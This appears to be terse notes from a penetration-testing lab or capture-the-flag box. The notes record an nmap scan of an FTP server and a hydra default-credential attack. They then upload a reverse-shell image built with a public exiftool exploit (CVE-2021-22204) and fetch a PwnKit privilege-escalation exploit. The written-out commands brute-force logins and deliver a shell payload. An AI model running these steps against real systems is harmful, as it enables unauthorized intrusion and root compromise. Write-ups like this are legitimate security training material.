
## NMAP

```bash
# Nmap 7.94SVN scan initiated Wed Oct  9 20:56:41 2024 as: nmap -vv --reason -Pn -T4 -sV -p 21 "--script=banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/... -oX /home/kali/... TARGET
Nmap scan report for TARGET
Host is up, received user-set (0.063s latency).
Scanned at 2024-10-09 20:56:41 EDT for 5s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  9 20:56:46 2024 -- 1 IP address (1 host up) scanned in 4.78 seconds

```

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

![Pasted image 20241009200829.png](Evidence/Pasted%20image%2020241009200829.png)

![Pasted image 20241009201237.png](Evidence/Pasted%20image%2020241009201237.png)

![Pasted image 20241009203905.png](Evidence/Pasted%20image%2020241009203905.png)

![Pasted image 20241009203914.png](Evidence/Pasted%20image%2020241009203914.png)

I followed the HTTP stream and found the exiftool version number 12.23

![Pasted image 20241009203936.png](Evidence/Pasted%20image%2020241009203936.png)

![Pasted image 20241009203945.png](Evidence/Pasted%20image%2020241009203945.png)

```
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
```

![Pasted image 20241009205252.png](Evidence/Pasted%20image%2020241009205252.png)
creates a reverse shell image.jpg


```
curl -F myFile=@kali.jpg http://TARGET/exiftest.php
```


![Pasted image 20241009205217.png](Evidence/Pasted%20image%2020241009205217.png)

![Pasted image 20241009205229.png](Evidence/Pasted%20image%2020241009205229.png)

![Pasted image 20241009211115.png](Evidence/Pasted%20image%2020241009211115.png)

Python PWNkit 

```
git clone https://github.com/joeammond/CVE-2021-4034.git
```

